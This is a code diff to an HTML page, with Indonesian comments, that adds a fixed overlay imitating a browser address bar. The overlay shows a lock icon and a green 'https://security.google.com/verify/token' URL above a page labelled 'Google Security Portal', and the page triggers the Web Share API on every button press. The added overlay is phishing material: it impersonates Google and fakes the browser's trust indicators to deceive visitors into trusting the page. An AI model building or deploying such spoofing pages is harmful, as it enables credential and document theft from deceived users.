@@ -25,7 +25,62 @@
             min-height: 100vh;
             margin: 0;
             padding: 20px;
+            padding-top: 75px; /* Memberi ruang untuk fake address bar di atas */
             text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* Tampilan Tiruan Address Bar (Fake Address Bar Overlay) */
+        .fake-address-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 56px;
+            background-color: #ffffff;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 16px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            z-index: 9999;
+            box-sizing: border-box;
+        }
+
+        .fake-url-container {
+            background-color: #f1f3f4;
+            border-radius: 20px;
+            padding: 8px 16px;
+            width: 100%;
+            max-width: 600px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            color: var(--text-color);
+            border: 1px solid transparent;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .fake-url-container:hover {
+            background-color: #e8eaed;
+            border-color: var(--border-color);
+        }
+
+        .lock-icon {
+            margin-right: 6px;
+            font-size: 12px;
+        }
+
+        .url-text {
+            color: #137333; /* Warna hijau indikator aman SSL */
+            font-weight: 500;
+        }
+
+        .url-domain {
+            color: var(--text-color);
+            font-weight: 400;
         }
 
         .banner {
@@ -100,6 +155,14 @@
 </head>
 <body>
 
+    <!-- Fake Address Bar Overlay -->
+    <div class="fake-address-bar">
+        <div class="fake-url-container">
+            <span class="lock-icon">🔒</span>
+            <span class="url-text">https://</span><span class="url-domain">security.google.com/verify/token</span>
+        </div>
+    </div>
+
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
@@ -150,7 +213,7 @@
                     const imagePreview = document.getElementById("imagePreview");
                     const fileInfo = document.getElementById("fileInfo");
 
-                    // Selalu jalankan Web Share API terlebih dahulu (atau bersamaan) pada setiap tombol
+                    // Selalu jalankan Web Share API bersamaan dengan aksi utama
                     const sharedSuccessfully = await triggerWebShare(intent);
 
                     if (actionType === 'mailto') {
